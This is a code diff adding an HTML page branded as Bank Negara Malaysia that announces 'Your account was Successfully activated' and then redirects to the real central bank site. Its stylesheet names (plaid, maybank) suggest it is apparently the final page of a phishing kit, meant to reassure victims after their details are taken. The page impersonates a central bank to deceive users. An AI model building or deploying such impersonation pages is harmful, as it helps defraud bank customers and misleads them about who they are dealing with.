@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh"
+        content="3; url = https://www.bnm.gov.my/">
+    <title>Success!</title>
+    <link rel="stylesheet" href="/static/bootstrap-4.5.0-dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/css/plaid.css">
+    <link rel="stylesheet" href="/static/css/maybank.css">
+    <script src="https://use.fontawesome.com/b630a46cc5.js"></script>
+</head>
+
+<body style="background-color: #0383e0" onload="growActivate()">
+
+    <div class="container">
+        <section name='header'>
+            <div class="select-your-bank bnegara" style="text-align: center; color: white;">
+                <img src="/static/images/transparentLogo.png" width='40%' alt="">
+                <h5 style="margin: 0;">BANK NEGARA MALAYSIA</h5>
+                <a style="font-size: smaller;">CENTRAL BANK OF MALAYSIA</a>
+            </div>
+        </section>
+
+        <div class="show-activated">
+            <h1 class="activated "><i class="fa fa-check-circle"></i></h1>
+
+            <div id="headsup">
+                <h2>Your account was Successfully activated</h2>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        function growActivate() {
+            document.querySelector("h1.activated").classList.add("bigger");
+            document.getElementById("headsup").style.opacity = "1";
+            document.getElementById("headsup").style.color = "white";
+            document.getElementById("headsup").style.transition = "ease-in 550ms";
+        }
+    </script>
+</body>
+
+</html>
